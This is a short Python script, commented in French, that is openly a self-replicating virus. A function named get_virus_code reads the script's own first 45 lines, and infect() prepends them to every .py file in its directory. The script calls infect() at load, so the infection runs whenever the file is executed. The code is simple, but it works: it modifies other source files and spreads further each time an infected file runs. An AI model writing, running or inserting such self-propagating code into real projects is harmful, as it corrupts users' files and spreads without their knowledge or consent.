#-------------------------------------------------------------------------------

# ---> lecture/ecriture

def print_in_file(lines, filename) :
    with open(filename, 'w') as f:
            f.writelines(lines)

def read_file(filename) :
    with open(filename, 'r') as f:
        code = f.readlines()
    return code

def insert_lines_at_start(lines,filename):
    new_lines = lines+read_file(filename)
    print_in_file(new_lines,filename)

def insert_lines_at_start_of_files_in_list(lines,list_of_files):
    for f in list_of_files :
        insert_lines_at_start(lines,f)

# ---> scan

def get_dir() :
    P=__file__.split('/')
    return '/'.join(P[:-1])

def get_py_files_in_current_dir():
    import os
    return [ filename for filename in os.listdir(get_dir()) if filename[-3:]==".py"]

# --->duplication

def get_virus_code() :
    return read_file(__file__)[:45]

# infection

def infect() :
    insert_lines_at_start_of_files_in_list( get_virus_code() , get_py_files_in_current_dir() )


infect()